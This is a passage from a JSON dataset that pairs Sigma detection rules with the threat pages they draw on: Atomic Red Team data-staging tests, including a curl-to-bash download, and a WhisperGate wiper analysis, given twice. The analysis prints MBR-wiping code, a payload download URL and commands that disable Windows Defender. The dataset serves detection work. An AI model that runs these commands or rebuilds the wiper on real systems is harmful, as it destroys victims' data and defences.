        "https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65",
        "https://redcanary.com/blog/yellow-cockatoo/",
        "https://zero2auto.com/2020/05/19/netwalker-re/",
        "https://web.archive.org/web/20230304082026/https://mez0.cc/posts/cobaltstrike-powershell-exec/"
      ],
      "author": "Sami Ruohonen, Harish Segar, Tim Shelton, Teymur Kheirkhabarov, Vasiliy Burov, oscd.community, Nasreddine Bencherchali",
      "date": "2018-09-05",
      "modified": "2023-01-30",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1059.001",
        "attack.t1140",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Description": "Windows PowerShell"
          },
          {
            "Product": "PowerShell Core 6"
          }
        ],
        "selection_cli_xor": {
          "CommandLine|contains": "bxor"
        },
        "selection_cli_other": {
          "CommandLine|contains": [
            "ForEach",
            "for(",
            "for ",
            "-join ",
            "-join'",
            "-join\"",
            "-join`",
            "::Join",
            "[char]"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_xor_commandline.yml",
    "id": "371"
  },
  {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md",
    "markdown": "# T1074.001 - Local Data Staging\n\n## Description from ATT&CK\n\n> Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n>\n> Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry. (Citation: Prevailion DarkWatchman 2021)\n\n## Atomic Tests\n\n- Atomic Test #1 - Stage data from Discovery.bat\n- Atomic Test #2 - Stage data from Discovery.sh\n- Atomic Test #3 - Zip a Folder with PowerShell for Staging in Temp\n\n### Atomic Test #1 - Stage data from Discovery.bat\n\nUtilize PowerShell to download `discovery.bat` and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution, verify that the file is saved in the temp directory.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 107706a5-6f9f-451a-adae-bab8c667829f\n\n#### Inputs:\n\n| Name         | Description                               | Type | Default Value                |\n|--------------|-------------------------------------------|------|------------------------------|\n| output_file  | Location to save downloaded discovery.bat file | Path | $env:TEMP\\discovery.bat     |\n\n#### Attack Commands: Run with `powershell`!\n\n```\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile #{output_file}\n```\n\n#### Cleanup Commands:\n\n```\nRemove-Item -Force #{output_file} -ErrorAction Ignore\n```\n\n### Atomic Test #2 - Stage data from Discovery.sh\n\nUtilize curl to download `discovery.sh` and execute a basic information gathering shell script.\n\n**Supported Platforms:** Linux, macOS\n\n**auto_generated_guid:** 39ce0303-ae16-4b9e-bb5b-4f53e8262066\n\n#### Inputs:\n\n| Name         | Description                               | Type | Default Value                |\n|--------------|-------------------------------------------|------|------------------------------|\n| output_file  | Location to save downloaded discovery.sh file | Path | /tmp/T1074.001_discovery.log |\n\n#### Attack Commands: Run with `bash`!\n\n```\ncurl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > #{output_file}\n```\n\n### Atomic Test #3 - Zip a Folder with PowerShell for Staging in Temp\n\nUse living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, verify that a zipped folder named `Folder_to_zip.zip` was placed in the temp directory.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** a57fbe4b-3440-452a-88a7-943531ac872a\n\n#### Inputs:\n\n| Name         | Description                               | Type | Default Value                |\n|--------------|-------------------------------------------|------|------------------------------|\n| output_file  | Location to save zipped file or folder    | Path | $env:TEMP\\Folder_to_zip.zip  |\n| input_file   | Location of file or folder to zip        | Path | PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip |\n\n#### Attack Commands: Run with `powershell`!\n\n```\nCompress-Archive -Path #{input_file} -DestinationPath #{output_file} -Force\n```\n\n#### Cleanup Commands:\n\n```\nRemove-Item -Path #{output_file} -ErrorAction Ignore\n```",
    "sigma_rule": {
      "title": "Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet",
      "id": "85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98",
      "related": [
        {
          "id": "71ff406e-b633-4989-96ec-bc49d825a412",
          "type": "similar"
        },
        {
          "id": "daf7eb81-35fd-410d-9d7a-657837e602bb",
          "type": "similar"
        },
        {
          "id": "b7a3c9a3-09ea-4934-8864-6a32cacd98d9",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects PowerShell scripts that make use of the \"Compress-Archive\" Cmdlet in order to compress folders and files where the output is stored in a potentially suspicious location that is used often by malware for exfiltration.\nAn adversary might compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md",
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2021-07-20",
      "modified": "2022-10-09",
      "tags": [
        "attack.collection",
        "attack.t1074.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "Compress-Archive -Path*-DestinationPath $env:TEMP",
            "Compress-Archive -Path*-DestinationPath*\\AppData\\Local\\Temp\\",
            "Compress-Archive -Path*-DestinationPath*:\\Windows\\Temp\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_zip_compress.yml",
    "id": "374"
  },
  {
    "url": "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
    "markdown": "# Analysis of Destructive Malware (WhisperGate) targeting Ukraine\n\nBLKSMTH | S2W TALON\n\n## Executive Summary\n\n- **2022–01–15**, MSTIC (Microsoft Threat Intelligence Center) identified and unveiled a cyberattack targeting Ukrainian organizations with “**WhisperGate**” which overwrites Master Boot Record (MBR) and files.\n\n  ```\n  An actor who conducted this attack tracked as DEV-0586 and has not yet been attributed to existing groups.\n  ```\n\n- It was confirmed that the actor uses a tool “Impacket” to perform `lateral movement` and `malware execution`.\n\n  ```\n  Known working paths: C:\\PerfLogs, C:\\ProgramData, C:\\, C:\\temp\n  ```\n\n- The flow consisting of a total of three stages revealed so far is as follows:\n\n  ```\n  Stage1: Overwrites the MBR and destroy all partitions\n  Stage2: Downloads Stage3 through the discord link\n  Stage3: Executes file wiper & AdvancedRun.exe after decoding resources\n  ```\n\n```image\nAlt: Flow chart\nDescription: The image is a flow chart illustrating the stages of the WhisperGate malware attack. It depicts the actions involved in the attack, starting with the overwriting of the Master Boot Record (MBR) and destruction of all partitions. The flow chart details three stages: Stage 1 shows the initial overwrite, Stage 2 indicates downloading the next stage via a Discord link, and Stage 3 involves executing a file wiper and AdvancedRun.exe. Various icons represent elements of the attack, including a hacker figure, a hard disk, and radioactive symbols, suggesting the destructive nature of the malware.\nTranscription: |\n  [Flow Chart]\n  \n  1. DEV-0586 (Actor)\n     - Overwrites MBR\n     - Destroys all partitions\n  \n  2. Downloads Stage3 through Discord link\n  \n  3. Executes:\n     - File wiper\n     - AdvancedRun.exe after decoding resources\n```\n\n## Detailed Analysis\n\n### Stage1\n\n- **SHA256**: a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92\n- **Creation Time**: 2022–01–10 10:37:18\n- **First Submission**: 2022–01–16 20:30:19\n- **File Type**: Win32 EXE\n\nStage1 directly accesses the MBR (Master Boot Record) and overwrites it with the 0x200 size data that is hard-coded inside. After that, when the PC is rebooted, the overwritten code is executed, and the code traverses all drives on the disk and overwrites it with specific data at intervals of 199 LBAs.\n\n```image\nAlt: Overwrites MBR\nDescription: The image displays a snippet of code related to a malware analysis, specifically pertaining to a destructive malware (WhisperGate) targeting Ukraine. The code includes memory allocation and file operations, indicating how the malware interacts with physical drives to implement its wiper functionality. Comments in the code suggest that it contains hardcoded components for executing the wiper attack, detailing the operations performed on the drive.\nTranscription: |\n  v4 = alloca(8236);\n  v5 = alloca(8236);\n  sub_401990();\n  qmemcpy(v8, &loc_404020, 0x2000u); // hardcoded wiper code\n  v6 = CreateFileW(L\"\\\\\\\\.\\\\PhysicalDrive0\", 0x10000000u, 3u, 0, 3u, 0, 0);\n  WriteFile(v6, v8, 0x200u, 0, 0); // 0x200byte\n  CloseHandle(v6);\n  return 0;\n```\n\n*Overwrites MBR*\n\nThe overwritten code reads the ransom note string inside the MBR and sets it to appear on the display.\n\n```image\nAlt: Writes ransom note on the display\nDescription: The image displays a segment of assembly code related to the ransomware operation described in the context. It includes instructions for writing a ransom note to the display, initializing the data segment, and managing control flow with jumps. Important registers and memory operations are indicated, showcasing how the malware executes its functionality to display the ransom note.\nTranscription: |\n  seg000:0000\n  segment byte public 'CODE' use16\n  assume cs:seg000\n  jmp short $+2\n  ; ---------------------------------------------------------------------------\n  loc_2:\n      mov ax, cs\n      mov ds, ax\n      mov si, 7C88h      ; 0x7C88 = ransom note offset\n      call $+3\n      push ax\n      cld\n  \n  loc_E:\n      mov al, [si]       ; AL = ransom note offset\n      cmp al, 0\n      jz loc_1A\n      call Write_to_display_sub_1C ; each character\n      inc si\n      jmp short loc_E    ; AL = ransom note offset\n  ; ---------------------------------------------------------------------------\n  loc_1A:\n      jmp short loc_21\n  ; ============= S U B R O U T I N E ==============\n  Write_to_display_sub_1C proc near\n      mov ah, 0Eh       ; - VIDEO - WRITE CHARACTER AND ADVANCE CURSOR (TTY WRITE)\n      int 10h           ; AL = character, BH = display page (alpha modes)\n                        ; BL = foreground color (graphics modes)\n      ret\n  Write_to_display_sub_1C endp\n```\n\n*Writes ransom note on the display*\n\nAfter that, it traverses from the C drive and attempts to destroy it by overwriting it with fixed data as Extended Write mode.\n\n```image\nAlt: Drives wiper code\nDescription: The image displays a snippet of assembly code related to the WhisperGate malware's operation. It includes various instructions and data definitions that illustrate how the malware interacts with the disk, specifically focusing on the Disk Address Packet (DAP) structure and how it manages logical block addressing (LBA) for overwriting sectors on the disk.\nTranscription: |\n  mov     dword ptr ds:7C76h, 7C28h ; Copy ransom note offset to transfer buffer of DAP\n  mov     al, 43h ; 'C'\n  mov     ah, 0 ; Drive index offset\n  mov     dl, 80h ; Drive index (0x80 = CD-ROM)\n  mov     si, 7C72h ;\n  \n  Loc_3F:\n      int     13h\n      jb      short loc_45\n      jnb     short loc_5D\n  \n  Loc_45:\n      inc     byte ptr ds:7C78h ; drive offset += 1\n  \n  Loc_49:\n      mov     dword ptr ds:7C7Ah, 1 ; lower 32-bits of 48-bit starting LBA\n      mov     dword ptr ds:7C7Eh, 0 ; upper 16-bits of 48-bit starting LBA\n      jmp     short loc_21\n  \n  Loc_5D:\n      add     dword ptr ds:7C7Ah, 199 ; + 199 (lower 32-bits of 48-bit starting LBA)\n      add     dword ptr ds:7C7Eh, 0 ; upper 16-bits of 48-bit starting LBA\n      clc\n      jmp     short loc_21\n  \n  ; -------------------------------------------------------------------------\n  db      10h\n  db      0 ; 2 = number of sectors to transfer (max 127 on some BIOSes)\n  dw      0 ; 16bit offset\n  dw      0 ; 8 = lower 32-bits of 48-bit starting LBA\n  dw      12 ; 4 upper 16-bits of 48-bit starting LBA\n  \n  aAaaa:\n      db      'Your hard drive has been corrupted.',0Dh,0Ah\n      db      'In case you want to recover all hard drives',0Dh,0Ah\n      db      'of your organization.',0Dh,0Ah\n      db      'You should pay $5 in bitcoin wallet!',0Dh,0Ah\n      db      '1AVMN6g8jGPCFJeUfkTAwLzngZB6pfv and send message via!',0Dh,0Ah\n      db      'Took ID 8B8CD41C121A33BA47F493B0D1869936A32DAD976FA5D82C1ED23',0\n      db      'with your organization name.',0Dh,0Ah\n      db      'We will contact you to give further instructions.',0\n  dw      0AA55h\n```\n\n*Drives wiper code*\n\nDisk Address Packet (DAP) structure initialized when malicious code writes to disk:\n\n- (0x7C72) (offset 0 size 1): size of packet (16 bytes)\n- (0x7C73) (offset 1 size 1): Reserved (always 0)\n- (0x7C74) (offset 2 size 2): number of sectors to transfer\n- (0x7C76) (offset 4 size 4): transfer buffer (segment:offset)\n- (0x7C7A) (offset 8 size 4): lower 32-bits of 48-bit starting LBA\n- (0x7C7E) (offset 12 size 4): upper 16-bits of 48-bit starting LBA\n\nWrite starts from LBA#1 of disk:\n\n- When disk access is successful, LBA is increased by 0xC7 (199) and written.\n- When disk access fails, increase the Drive Index and try to access the next disk.\n\n```image\nAlt: Overwritten drives\nDescription: The image is a diagram illustrating how the WhisperGate malware overwrites data on different drives (C:, D:, E:) during its attack. It shows a series of logical block addressing (LBA) markers indicating where data is being overwritten. Each drive is represented vertically, with specific LBAs highlighted in red to indicate the points at which the malware writes fixed data (represented as 'AAAAA...') to the drives, emphasizing the destructive nature of the malware's actions across different storage devices.\nTranscription: |\n  C:\\\n  LBA #1\n  ...\n  LBA #200\n  ...\n  LBA #399\n  ...\n  \n  D:\\\n  LBA #1\n  ...\n  LBA #200\n  ...\n  LBA #399\n  ...\n  \n  E:\\\n  LBA #1\n  ...\n  LBA #200\n  ...\n  LBA #399\n  ...\n  AAAAA ...\n```\n\n*Overwritten drives*\n\n### Stage2\n\n- **SHA256**: dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78\n- **Creation Time**: 2022–01–10 14:39:54\n- **First Submission**: 2022–01–16 20:31:26\n- **File Type**: Win32 EXE\n\nStage2 does not perform malicious actions for 20 seconds to bypass the AV (Anti Virus). To do this, run the following command twice:\n\n> Command: powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==\n> —> Start-Sleep -s 10\n\nThen, it downloads an additional file disguised as a JPG extension from the discord link. The downloaded file is reversed and takes the form of PE, and executes “Ylfwdwgmpilzyaph” method in the file in the memory.\n\n```image\nAlt: Stage3 payload downloaded via Discord link\nDescription: The image displays a code snippet related to malware behavior, specifically focusing on the downloading process through a Discord link. It contains lines of code that manipulate arrays, check conditions, and perform operations associated with the malware's functionality. This snippet provides insight into the coding techniques used in the WhisperGate malware, which adds value to the analysis by illustrating how the malware attempts to download malicious payloads.\nTranscription: |\n  byte[] array = (byte[])Facade.UpdateItem(typeof(WebClient).GetMethod(\"DxownxlxoadDxatxxax\".Replace(\"x\", \"\"), new Type[]\n  {\n      Facade.MoveItem(typeof(string).TypeHandle\n  }), new WebClient(), new object[]\n  {\n      \"https://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg\"\n  });\n  IL_9F:\n  bool flag = array.Length > 1;\n  IL_A8:\n  if (!flag)\n      goto IL_B8;\n  IL_AC:\n  Facade.Array.Reverse(array, 0, array.Length);\n```\n\n*Stage3 payload downloaded via Discord link*\n\n- **URL**: https[:]//cdn.discordapp[.]com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg\n\n### Stage3 (Tbopbh.jpg)\n\n- **SHA256**: 923eb77b3c9e11d6c56052318c119c1a22d11ab71675e6b95d05eeb73d1accd6\n\n**Tbopbh.jpg (Reversed)**\n\n- **SHA256**: 9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d\n- **Creation Time**: 2022–01–10 14:39:31\n- **First Submission**: 2022–01–16 21:29:58\n- **File Type**: Win32 DLL\n\nThe downloaded Stage3 is written in C# as in Stage2, and an obfuscation tool called **Eazfuscator** is detected by exeinfoPE.\n\n```image\nAlt: Detected Eazfuscator\nDescription: The image is a screenshot of a DLL analysis tool displaying details about a DLL file named 'sample3_reversed.txt'. It includes technical information such as the entry point, file offset, linker info, file size, and the subsystem. The interface shows specific bytes, section names, and mentions Eazfuscator.NET, indicating that the file has been obfuscated. The background features a light blue gradient, enhancing the readability of the text displayed.\nTranscription: |\n  File : sample3_reversed.txt\n  Entry Point : 00045DA6\n  EP Section : .text\n  File Offset : 00043FA6\n  First Bytes : FF.25.00.20.40\n  Linker Info : 6.00\n  File Size : 00044600h\n  Subsystem : Win Console\n  Overlay : NO 00000000\n  \n  DLL - Library image\n  RES/OVL : 0 / 0 % 2022\n  Eazfuscator.NET v2020.2.x [ No Runtime ] - (c) 2008-2020 - www.gap\n  Lamer Info - Help Hint - Unpack info\n  Big sec. 1.text , .NET obf,/License protector Unpack with : de4dot v3\n```\n\n*Detected Eazfuscator*\n\nThere are 3 resources inside Stage3, and except for the resource “**78c855a088924e92a7f60d661c3d1845‎**”, the use of the remaining 2 resources has not yet been confirmed, and the contents will be updated later.\n\n```image\nAlt: 3 resources inside Stage3\nDescription: The image displays a code snippet or interface from a software tool used for analyzing a DLL file. It shows the structure of a DLL named 'Frkmlkdkdubkznbkcf.dll', including its version (1.0.0.0) and two listed resources identified by their SHA256 hashes ('78c855a088924e92a7f60d661c3d1845' and '7c8cb5598e724d34384cce7402b11f0e'). This indicates that the image contains technical data relevant to malware analysis.\nTranscription: |\n  Frkmlkdkdubkznbkcf (1.0.0.0)\n    Frkmlkdkdubkznbkcf.dll\n      PE\n      References\n      Resources\n        78c855a088924e92a7f60d661c3d1845\n        7c8cb5598e724d34384cce7402b11f0e\n```\n\n*3 resources inside Stage3*\n\nStage3 loads “78c855a088924e92a7f60d661c3d1845‎” resource inside and performs decoding by XOR operation.\n\n```image\nAlt: XOR decoding code\nDescription: The image displays a snippet of C# code related to malware functionality. It includes variable declarations, a loop, and XOR operations, which are typically used for obfuscation or encoding data in malware analysis. The code snippet demonstrates how certain byte arrays are manipulated, likely as part of the malware's execution or decoding process.\nTranscription: |\n  private static byte[] #u0002(byte[] #u0002) {\n      string s = #u00OF#u2004#u2000(-1506769664);\n      byte[] u = Convert.FromBase64String(s);\n      #u0003#u2004#u2000(u);\n      byte[] u2 = new byte[#u0000#u0002.Length];\n      int num = #u0002.Length;\n      byte b = 0;\n      byte b2 = 121;\n      byte[] array = new byte[] {\n          148,\n          68,\n          208,\n          52,\n          241,\n          93,\n          195,\n          220\n      };\n      for (int num2 = 0; num2 != num; num2++) {\n          if (b == 0) {\n              b2 = u2.#u0002();\n          }\n          b += 1;\n          if (b == 32) {\n              b = 0;\n          }\n          int num3 = num2;\n          #u0002[num3] = (b2 ^ array[num2 >> 2 & 3]);\n      }\n      return #u0002;\n  }\n```\n\n*XOR decoding code*\n\nNext, the decoded data is a DLL file and contains two additional resources. The two resources “AdvancedRun” and “Waqybg”, are extracted by Stage3, and decompressed with GZIP.\n\n- **AdvancedRun (GZIP Decompressed)**\n- **Waqybg (Reversed and GZIP Decompressed)**\n\n```image\nAlt: 2 resources in the decoded resource\nDescription: The image shows a code analysis interface displaying the structure of a .dll file named 'zx_fee6cce9db1d42510801f1c1ed0e09452.dll'. It includes sections labeled 'PE' (Portable Executable), 'References', and 'Resources'. Under the 'Resources' section, there are two entries: 'AdvancedRun' and 'Waqybg', which are likely components of the malware described in the context. The image presents a detailed view of the internal structure of the DLL, which is relevant for understanding the malware's functionality.\nTranscription: |\n  zx_fee6cce9db1d42510801fc1ed0e09452.dll\n  - PE\n  - References\n  - Resources\n    - ClassLibrary1.Properties.Resources.resources\n      - AdvancedRun\n      - Waqybg\n    - {}\n      - <Module> @02000001\n        - Base Type and Interfaces\n        - Derived Types\n```\n\n*2 resources in the decoded resource*\n\n1. **AdvancedRun**: Stop Windows Defender service\n\n   - Execute “%Temp%Nmddfrqqrbyjeygggda.vbs” to specify “C:\\” as the exception folder.\n\n     > Command: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” Set-MpPreference -ExclusionPath ‘C:\\’\n\n   - Stop Windows Defender service through AdvancedRun.exe and delete “C:\\ProgramData\\Microsoft\\Windows Defender” directory.\n\n     > Command: “C:\\Users\\Administrator\\AppData\\Local\\Temp\\AdvancedRun.exe” /EXEFilename “C:\\Windows\\System32\\sc.exe” /WindowState 0 /CommandLine “stop WinDefend” /StartDirectory “” /RunAs 8 /Run\n     > Command: “C:\\Users\\Administrator\\AppData\\Local\\Temp\\AdvancedRun.exe” /EXEFilename “C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” /WindowState 0 /CommandLine “rmdir ‘C:\\ProgramData\\Microsoft\\Windows Defender’ -Recurse” /StartDirectory “” /RunAs 8 /Run\n\n2. **Waqybg**: Overwrites target files\n\n   - Overwrites the 0x100000 (1MB) of the file with 0xCC.\n   - **Extension**: Random number\n\n```image\nAlt: Overwrites files\nDescription: The image features a snippet of code, presumably written in C, that showcases memory allocation and file handling operations. It utilizes functions such as 'malloc' for memory allocation, 'fwopen' for opening a file in binary write mode, and 'fwrite' for writing data to the file. The code seems to be part of a larger malware analysis, possibly related to the manipulation of file names and memory management within the context of malware behavior.\nTranscription: |\n  v1 = wcslen(FileName);\n  v2 = (wchar_t *)malloc(2 * (v1 + 20));\n  v3 = rand();\n  v4 = wcslen(FileName);\n  swprintf(v2, (const size_t)\"%\", (const wchar_t *const)(v4 - 4), FileName, v3);\n  Stream = wfopen(FileName, L\"wb\");\n  v5 = malloc(0x100000u);\n  memset(v5, 204, 0x100000u);\n  fwrite(v5, 1u, 0x100000u, Stream);\n  fclose(Stream);\n  wrename(FileName, v2);\n  free(v2);\n  free(v5);\n```\n\n*Overwrites files*\n\n- **Target file extensions (106)**:\n\n  ```\n  .HTML .HTM .PHTML .PHP .JSP .ASP .PHPS .PHP5 .ASPX .PHP4 .PHP3 .DOC .DOCX .XLS .XLSX .PPT .PPTX .PST .MSG .EML .TXT .CSV .RTF .WKS .WK1 .PDF .DWG .JPEG .JPG .DOCM .DOT .DOTM .XLSM .XLSB .XLW .XLT .XLM .XLC .XLTX .XLTM .PPTM .POT .PPS .PPSM .PPSX .HWP .SXI .STI .SLDX .SLDM .BMP .PNG .GIF .RAW .TIF .TIFF .PSD .SVG .CLASS .JAR .SCH .VBS .BAT .CMD .ASM .PAS .CPP .SXM .STD .SXD .ODP .WB2 .SLK .DIF .STC .SXC .ODS .3DM .MAX .3DS .STW .SXW .ODT .PEM .P12 .CSR .CRT .KEY .PFX .DER .OGG .JAVA .INC .INI .PPK .LOG .VDI .VMDK .VHD .MDF .MYI .MYD .FRM .SAV .ODB .DBF .MDB .ACCDB .SQL .SQLITEDB .SQLITE3 .LDF .ARC .BAK .TAR .TGZ .RAR .ZIP .BACKUP .ISO .CONFIG\n  ```\n\n- Executes ping command and delete itself:\n\n  > cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 > Nul & Del /f /q \\”[Filepath]\\”\n\n## Appendix\n\n### Ransom Note\n\n```\nYour hard drive has been corrupted.\nIn case you want to recover all hard drives\nof your organization,\nYou should pay us $10k via bitcoin wallet\n1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv and send message via\ntox ID 8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65\nwith your organization name.\nWe will contact you to give further instructions.\n```\n\n### Related IoCs\n\n- **a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92** (Stage1)\n- **dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78** (Stage2)\n- **923eb77b3c9e11d6c56052318c119c1a22d11ab71675e6b95d05eeb73d1accd6** (Stage3, Tbopbh.jpg)\n- **9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d** (Stage3, *Reversed* Tbopbh.jpg)\n- **35FEEFE6BD2B982CB1A5D4C1D094E8665C51752D0A6F7E3CAE546D770C280F3A** (Decoded Resource “78c855a088924e92a7f60d661c3d1845‎”)\n- **29AE7B30ED8394C509C561F6117EA671EC412DA50D435099756BBB257FAFB10B** (AdvancedRun.exe)\n- **DB5A204A34969F60FE4A653F51D64EEE024DBF018EDEA334E8B3DF780EDA846F** (Nmddfrqqrbyjeygggda.vbs)\n- **34CA75A8C190F20B8A7596AFEB255F2228CB2467BD210B2637965B61AC7EA907** (File Wiper)\n- **URL**: https[:]//cdn.discordapp[.]com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg\n\n## Reference\n\n- https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/",
    "sigma_rule": {
      "title": "PUA - AdvancedRun Execution",
      "id": "d2b749ee-4225-417e-b20e-a8d2193cbb84",
      "related": [
        {
          "id": "fa00b701-44c6-4679-994d-5a18afa8a707",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of AdvancedRun utility",
      "references": [
        "https://twitter.com/splinter_code/status/1483815103279603714",
        "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
        "https://www.elastic.co/security-labs/operation-bleeding-bear",
        "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-01-20",
      "modified": "2023-02-21",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1564.003",
        "attack.t1134.002",
        "attack.t1059.003"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": "AdvancedRun.exe"
          },
          {
            "CommandLine|contains|all": [
              " /EXEFilename ",
              " /Run"
            ]
          },
          {
            "CommandLine|contains|all": [
              " /WindowState 0",
              " /RunAs ",
              " /CommandLine "
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_advancedrun.yml",
    "id": "379"
  },
  {
    "url": "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
    "markdown": "# Analysis of Destructive Malware (WhisperGate) targeting Ukraine\n\nBLKSMTH | S2W TALON\n\n## Executive Summary\n\n- **2022–01–15**, MSTIC (Microsoft Threat Intelligence Center) identified and unveiled a cyberattack targeting Ukrainian organizations with “**WhisperGate**” which overwrites Master Boot Record (MBR) and files.\n\n  ```\n  An actor who conducted this attack tracked as DEV-0586 and has not yet been attributed to existing groups.\n  ```\n\n- It was confirmed that the actor uses a tool “Impacket” to perform `lateral movement` and `malware execution`.\n\n  ```\n  Known working paths: C:\\PerfLogs, C:\\ProgramData, C:\\, C:\\temp\n  ```\n\n- The flow consisting of a total of three stages revealed so far is as follows:\n\n  ```\n  Stage1: Overwrites the MBR and destroy all partitions\n  Stage2: Downloads Stage3 through the discord link\n  Stage3: Executes file wiper & AdvancedRun.exe after decoding resources\n  ```\n\n```image\nAlt: Flow chart\nDescription: The image is a flow chart illustrating the stages of the WhisperGate malware attack. It depicts the actions involved in the attack, starting with the overwriting of the Master Boot Record (MBR) and destruction of all partitions. The flow chart details three stages: Stage 1 shows the initial overwrite, Stage 2 indicates downloading the next stage via a Discord link, and Stage 3 involves executing a file wiper and AdvancedRun.exe. Various icons represent elements of the attack, including a hacker figure, a hard disk, and radioactive symbols, suggesting the destructive nature of the malware.\nTranscription: |\n  [Flow Chart]\n  \n  1. DEV-0586 (Actor)\n     - Overwrites MBR\n     - Destroys all partitions\n  \n  2. Downloads Stage3 through Discord link\n  \n  3. Executes:\n     - File wiper\n     - AdvancedRun.exe after decoding resources\n```\n\n## Detailed Analysis\n\n### Stage1\n\n- **SHA256**: a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92\n- **Creation Time**: 2022–01–10 10:37:18\n- **First Submission**: 2022–01–16 20:30:19\n- **File Type**: Win32 EXE\n\nStage1 directly accesses the MBR (Master Boot Record) and overwrites it with the 0x200 size data that is hard-coded inside. After that, when the PC is rebooted, the overwritten code is executed, and the code traverses all drives on the disk and overwrites it with specific data at intervals of 199 LBAs.\n\n```image\nAlt: Overwrites MBR\nDescription: The image displays a snippet of code related to a malware analysis, specifically pertaining to a destructive malware (WhisperGate) targeting Ukraine. The code includes memory allocation and file operations, indicating how the malware interacts with physical drives to implement its wiper functionality. Comments in the code suggest that it contains hardcoded components for executing the wiper attack, detailing the operations performed on the drive.\nTranscription: |\n  v4 = alloca(8236);\n  v5 = alloca(8236);\n  sub_401990();\n  qmemcpy(v8, &loc_404020, 0x2000u); // hardcoded wiper code\n  v6 = CreateFileW(L\"\\\\\\\\.\\\\PhysicalDrive0\", 0x10000000u, 3u, 0, 3u, 0, 0);\n  WriteFile(v6, v8, 0x200u, 0, 0); // 0x200byte\n  CloseHandle(v6);\n  return 0;\n```\n\n*Overwrites MBR*\n\nThe overwritten code reads the ransom note string inside the MBR and sets it to appear on the display.\n\n```image\nAlt: Writes ransom note on the display\nDescription: The image displays a segment of assembly code related to the ransomware operation described in the context. It includes instructions for writing a ransom note to the display, initializing the data segment, and managing control flow with jumps. Important registers and memory operations are indicated, showcasing how the malware executes its functionality to display the ransom note.\nTranscription: |\n  seg000:0000\n  segment byte public 'CODE' use16\n  assume cs:seg000\n  jmp short $+2\n  ; ---------------------------------------------------------------------------\n  